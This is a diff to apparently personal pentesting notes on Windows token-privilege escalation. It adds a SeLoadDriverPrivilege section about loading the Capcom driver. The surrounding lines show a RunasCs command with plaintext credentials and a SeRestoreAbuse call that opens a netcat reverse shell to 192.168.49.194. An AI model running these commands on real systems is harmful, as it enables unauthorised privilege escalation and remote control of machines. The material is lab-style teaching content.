@@ -156,6 +156,10 @@ PS> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell I
 
 {% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" %}
 
+<mark style="color:red;">**NOTE:**</mark> If stuck, or unsure: ippsec.rocks is a great source to walk you through the exploitation of these token privileges.
+
+
+
 The first thing to do when popping a Windows shell is to check the user privileges.
 
 ```powershell
@@ -215,11 +219,15 @@ Run [EnableSeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Mis
 .\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.49.194 445 -e powershell.exe"
 ```
 
-####
-
-SeDebugPrivilege
 
 
+### SeLoadDriverPrivilege
+
+This allows us to load and unload malicious drivers in kernel mode. TLDR: Very bad. The common approach is to upload the "CapCom" driver as it's easy to exploit. We can download the driver to our Windows VM and compile it, then transfer it to the vulnerable machine and load the driver.
+
+Follow this blog post here and download capcom & required files:
+
+{% embed url="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/" %}
 
 ### SeDebugPrivilege
 
